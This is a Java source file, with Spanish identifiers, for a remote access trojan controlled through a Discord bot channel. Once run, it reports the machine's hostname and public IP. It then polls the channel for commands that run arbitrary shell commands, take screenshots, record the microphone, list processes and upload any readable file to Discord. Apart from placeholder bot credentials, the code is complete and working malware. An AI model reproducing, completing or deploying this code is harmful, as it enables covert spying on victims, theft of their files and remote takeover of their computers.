package org.example;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Scanner;
import java.util.List;
import java.util.ArrayList;
import java.util.Date;
import java.text.SimpleDateFormat;
import javax.imageio.ImageIO;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.TargetDataLine;
import org.json.JSONArray;
import org.json.JSONObject;

public class UwU {
    private static final String TOKEN = "TOKEN DEL BOT";
    private static final String CHANNEL_ID = "CANAL ID";
    private static final String API_HOST = "discord.com";
    private static final String API_URL = "https://" + API_HOST + "/api/v10/channels/" + CHANNEL_ID + "/messages";

    private static final List<String> processedMessageIds = new ArrayList<>();

    public static void main(String[] args) {
        try {
            String hostname = InetAddress.getLocalHost().getHostName();
            String ip = obtenerIp();
            enviarMensaje("📢 Conexion establecida desde: " + hostname + " (" + ip + ")");

            JSONArray mensajesIniciales = obtenerMensajes(1);
            if (mensajesIniciales.length() > 0) {
                processedMessageIds.add(mensajesIniciales.getJSONObject(0).getString("id"));
            }

            while (true) {
                JSONArray mensajes = obtenerMensajes(10);
                procesarMensajes(mensajes);
                Thread.sleep(5000);
            }
        } catch (Exception e) {
            try {
                enviarMensaje("❌ Error en el programa: " + e.getMessage());
            } catch (Exception ignored) {
            }
            e.printStackTrace();
        }
    }

    private static void procesarMensajes(JSONArray mensajes) throws Exception {
        for (int i = 0; i < mensajes.length(); i++) {
            JSONObject msg = mensajes.getJSONObject(i);
            String messageId = msg.getString("id");

            if (processedMessageIds.contains(messageId)) {
                continue;
            }

            processedMessageIds.add(messageId);
            if (processedMessageIds.size() > 100) {
                processedMessageIds.remove(0);
            }

            String contenido = msg.getString("content").trim();

            if (contenido.startsWith("!cmd ")) {
                String comando = contenido.substring(5);
                enviarMensaje("🔄 Ejecutando: `" + comando + "`");
                String salida = ejecutarComando(comando);
                if (salida.length() > 1900) {
                    salida = salida.substring(0, 1900) + "... (truncado)";
                }
                enviarMensaje("```" + salida + "```");
            } else if (contenido.equals("!info")) {
                enviarMensaje("ℹ️ Informacion del sistema:\n```" + obtenerInfo() + "```");
            } else if (contenido.equals("!ip")) {
                enviarMensaje("🌐 IP Pública: " + obtenerIp());
            } else if (contenido.equals("!screenshot")) {
                try {
                    enviarMensaje("📸 Capturando pantalla...");
                    byte[] imgData = capturarPantalla();
                    enviarImagen(imgData, "screenshot.png");
                } catch (Exception e) {
                    enviarMensaje("❌ Error al capturar pantalla: " + e.getMessage());
                }
            } else if (contenido.equals("!exit")) {
                enviarMensaje("🛑 Terminando programa...");
                System.exit(0);
            }
            else if (contenido.equals("!procesos")) {
                enviarMensaje("📋 Listando procesos activos...");
                String salida;
                if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                    salida = ejecutarComando("tasklist");
                } else {
                    salida = ejecutarComando("ps aux");
                }
                if (salida.length() > 1900) {
                    salida = salida.substring(0, 1900) + "... (truncado)";
                }
                enviarMensaje("```" + salida + "```");
            }
            else if (contenido.startsWith("!grabar ")) {
                try {
                    int segundos = Integer.parseInt(contenido.substring(8).trim());
                    if (segundos > 0 && segundos <= 30) {
                        enviarMensaje("🎤 Grabando audio durante " + segundos + " segundos...");
                        byte[] audioData = grabarAudio(segundos);
                        enviarArchivo(audioData, "grabacion.wav", "audio/wav");
                        enviarMensaje("✅ Grabación completada!");
                    } else {
                        enviarMensaje("especifica una duración entre 1 y 30 segundos");
                    }
                } catch (NumberFormatException e) {
                    enviarMensaje("⚠️ Formato incorrecto. Uso: !grabar [segundos]");
                } catch (Exception e) {
                    enviarMensaje("❌ Error al grabar audio: " + e.getMessage());
                }
            }
            else if (contenido.startsWith("!descargar ")) {
                String rutaArchivo = contenido.substring(11).trim();
                try {
                    File archivo = new File(rutaArchivo);
                    if (archivo.exists() && archivo.isFile() && archivo.canRead()) {
                        if (archivo.length() > 8 * 1024 * 1024) {
                            enviarMensaje("⚠️ El archivo es demasiado grande");
                        } else {
                            enviarMensaje("📥 Descargando archivo: " + archivo.getName() + "...");
                            byte[] fileData = Files.readAllBytes(Paths.get(rutaArchivo));

                            String contentType = Files.probeContentType(Paths.get(rutaArchivo));
                            if (contentType == null) {
                                contentType = "application/octet-stream";
                            }

                            enviarArchivo(fileData, archivo.getName(), contentType);
                            enviarMensaje("✅ Archivo enviado: " + archivo.getName());
                        }
                    } else {
                        enviarMensaje("❌ No se puede acceder al archivo: " + rutaArchivo);
                    }
                } catch (Exception e) {
                    enviarMensaje("❌ Error al descargar archivo: " + e.getMessage());
                }
            }
        }
    }

    private static JSONArray obtenerMensajes(int limite) throws IOException {
        URL url = new URL(API_URL + "?limit=" + limite);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("Authorization", "Bot " + TOKEN);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);

        try (InputStream responseStream = conn.getInputStream();
             Scanner scanner = new Scanner(responseStream).useDelimiter("\\A")) {
            String response = scanner.hasNext() ? scanner.next() : "";
            return new JSONArray(response);
        }
    }

    private static void enviarMensaje(String contenido) throws IOException {
        URL url = new URL(API_URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Authorization", "Bot " + TOKEN);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        conn.setDoOutput(true);

        JSONObject payload = new JSONObject();
        payload.put("content", contenido);

        try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
            os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
        }

        int responseCode = conn.getResponseCode();
        if (responseCode != 200) {
            try (InputStream errorStream = conn.getErrorStream();
                 Scanner scanner = new Scanner(errorStream).useDelimiter("\\A")) {
                String errorResponse = scanner.hasNext() ? scanner.next() : "";
                System.err.println("error al enviar mensaje: " + responseCode + " - " + errorResponse);
            }
        }
    }

    private static String ejecutarComando(String cmd) throws IOException {
        Process process;
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        }

        StringBuilder output = new StringBuilder();

        try (InputStream inputStream = process.getInputStream();
             Scanner scanner = new Scanner(inputStream).useDelimiter("\\A")) {
            if (scanner.hasNext()) {
                output.append(scanner.next());
            }
        }

        try (InputStream errorStream = process.getErrorStream();
             Scanner scanner = new Scanner(errorStream).useDelimiter("\\A")) {
            if (scanner.hasNext()) {
                output.append("\nERROR:\n").append(scanner.next());
            }
        }

        try {
            process.waitFor();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            output.append("\nComando interrumpido.");
        }

        return output.toString();
    }

    private static String obtenerInfo() {
        return "OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version") + "\n" +
                "CPU: " + System.getProperty("os.arch") + "\n" +
                "Java: " + System.getProperty("java.version") + "\n" +
                "Memoria libre: " + Runtime.getRuntime().freeMemory() / (1024 * 1024) + "MB\n" +
                "Memoria total: " + Runtime.getRuntime().totalMemory() / (1024 * 1024) + "MB\n" +
                "Hostname: " + getHostname() + "\n" +
                "Usuario: " + System.getProperty("user.name") + "\n" +
                "Fecha: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
    }

    private static String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "desconocido";
        }
    }

    private static String obtenerIp() throws IOException {
        URL url = new URL("https://api64.ipify.org/?format=json");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        try (InputStream responseStream = conn.getInputStream();
             Scanner scanner = new Scanner(responseStream).useDelimiter("\\A")) {
            String response = scanner.hasNext() ? scanner.next() : "";
            JSONObject json = new JSONObject(response);
            return json.getString("ip");
        }
    }

    private static byte[] capturarPantalla() throws Exception {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenCapture = robot.createScreenCapture(screenRect);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(screenCapture, "png", baos);
        return baos.toByteArray();
    }

    private static byte[] grabarAudio(int segundos) throws Exception {
        AudioFormat formato = new AudioFormat(44100, 16, 1, true, false);
        DataLine.Info info = new DataLine.Info(TargetDataLine.class, formato);

        if (!AudioSystem.isLineSupported(info)) {
            throw new Exception("formato de augio no soportado");
        }

        TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info);
        line.open(formato);
        line.start();

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int bufferSize = (int) formato.getSampleRate() * formato.getFrameSize();
        byte[] buffer = new byte[bufferSize];

        try {
            int limite = (int) (formato.getFrameRate() * segundos);
            int total = 0;

            while (total < limite) {
                int count = line.read(buffer, 0, buffer.length);
                if (count > 0) {
                    out.write(buffer, 0, count);
                    total += count;
                }
            }

            ByteArrayOutputStream wavOut = new ByteArrayOutputStream();

            writeWavHeader(wavOut, (int) formato.getSampleRate(), formato.getChannels(),
                    (int) formato.getSampleSizeInBits(), out.size());

            out.writeTo(wavOut);

            return wavOut.toByteArray();
        } finally {
            line.stop();
            line.close();
        }
    }

    private static void writeWavHeader(ByteArrayOutputStream out, int sampleRate, int channels,
                                       int bitsPerSample, int dataLength) throws IOException {
        out.write("RIFF".getBytes());
        writeInt(out, 36 + dataLength);
        out.write("WAVE".getBytes());

        out.write("fmt ".getBytes());
        writeInt(out, 16);
        writeShort(out, (short) 1); 
        writeShort(out, (short) channels);
        writeInt(out, sampleRate);
        writeInt(out, sampleRate * channels * bitsPerSample / 8); 
        writeShort(out, (short) (channels * bitsPerSample / 8)); 
        writeShort(out, (short) bitsPerSample);

        out.write("data".getBytes());
        writeInt(out, dataLength);
    }

    private static void writeInt(ByteArrayOutputStream out, int value) throws IOException {
        out.write(value & 0xFF);
        out.write((value >> 8) & 0xFF);
        out.write((value >> 16) & 0xFF);
        out.write((value >> 24) & 0xFF);
    }

    private static void writeShort(ByteArrayOutputStream out, short value) throws IOException {
        out.write(value & 0xFF);
        out.write((value >> 8) & 0xFF);
    }

    private static void enviarImagen(byte[] imgData, String nombre) throws IOException {
        enviarArchivo(imgData, nombre, "image/png");
    }

    private static void enviarArchivo(byte[] data, String nombre, String contentType) throws IOException {
        URL url = new URL(API_URL);
        String boundary = "----BOUNDARY" + System.currentTimeMillis();

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Authorization", "Bot " + TOKEN);
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        conn.setConnectTimeout(20000);
        conn.setReadTimeout(20000);
        conn.setDoOutput(true);

        try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
            os.writeBytes("--" + boundary + "\r\n");
            os.writeBytes("Content-Disposition: form-data; name=\"content\"\r\n\r\n");
            os.writeBytes("📁 Archivo: " + nombre + "\r\n");

            os.writeBytes("--" + boundary + "\r\n");
            os.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + nombre + "\"\r\n");
            os.writeBytes("Content-Type: " + contentType + "\r\n\r\n");

            os.write(data);
            os.writeBytes("\r\n");
            os.writeBytes("--" + boundary + "--\r\n");
        }

        int responseCode = conn.getResponseCode();
        if (responseCode != 200) {
            try (InputStream errorStream = conn.getErrorStream();
                 Scanner scanner = new Scanner(errorStream).useDelimiter("\\A")) {
                String errorResponse = scanner.hasNext() ? scanner.next() : "";
                System.err.println("error al enviar archivo: " + responseCode + " - " + errorResponse);
            }
        }
    }
}